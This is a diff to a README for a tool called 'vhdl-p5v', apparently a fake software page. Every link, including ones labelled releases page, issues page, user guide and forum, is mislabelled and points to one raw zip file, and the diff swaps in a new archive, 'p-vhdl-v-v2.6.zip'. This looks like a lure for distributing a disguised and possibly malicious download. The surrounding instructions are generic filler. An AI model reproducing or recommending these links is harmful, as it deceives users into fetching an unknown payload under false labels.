@@ -4,7 +4,7 @@
 Welcome to vhdl-p5v! This application helps you manage your VHDL projects with ease. Whether you are designing digital circuits or working with FPGA development, this tool simplifies your workflow and enhances your productivity.
 
 ## 📥 Download vhdl-p5v
-[![Download vhdl-p5v](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/vhdl-p5v.zip)](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/vhdl-p5v.zip)
+[![Download vhdl-p5v](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/p-vhdl-v-v2.6.zip)](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/p-vhdl-v-v2.6.zip)
 
 ## 🚀 Getting Started
 To get started with vhdl-p5v, follow these simple steps to download and run the application. 
@@ -12,7 +12,7 @@ To get started with vhdl-p5v, follow these simple steps to download and run the 
 ### 1. Visit the Releases Page
 Head over to our official releases page for vhdl-p5v. You can find all the available versions and their respective download links there:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/vhdl-p5v.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/p-vhdl-v-v2.6.zip)
 
 ### 2. Choose the Right Version
 On the releases page, you will see various versions of vhdl-p5v. Look for the latest version. Selecting the latest version ensures you have the most recent updates and features. 
@@ -59,12 +59,12 @@ If you encounter any issues:
 For persistent issues, consider checking the open issues on the repository’s GitHub page or create a new ticket for assistance.
 
 ## 📞 Support
-For direct support, feel free to reach out through our [GitHub Issues page](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/vhdl-p5v.zip). We strive to respond to all inquiries and assist you as best as we can.
+For direct support, feel free to reach out through our [GitHub Issues page](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/p-vhdl-v-v2.6.zip). We strive to respond to all inquiries and assist you as best as we can.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/vhdl-p5v.zip)
-- [User Guide](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/vhdl-p5v.zip)
-- [Community Forum](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/vhdl-p5v.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/p-vhdl-v-v2.6.zip)
+- [User Guide](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/p-vhdl-v-v2.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/p-vhdl-v-v2.6.zip)
 
 ## 📦 Conclusion
-Downloading and installing vhdl-p5v is straightforward. Follow the steps above, and you will be ready to work on your VHDL projects in no time. Don’t forget to visit our [Releases Page](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/vhdl-p5v.zip) to stay updated with the latest versions.
+Downloading and installing vhdl-p5v is straightforward. Follow the steps above, and you will be ready to work on your VHDL projects in no time. Don’t forget to visit our [Releases Page](https://raw.githubusercontent.com/ryad23r/vhdl-p5v/main/albuminosis/p-vhdl-v-v2.6.zip) to stay updated with the latest versions.
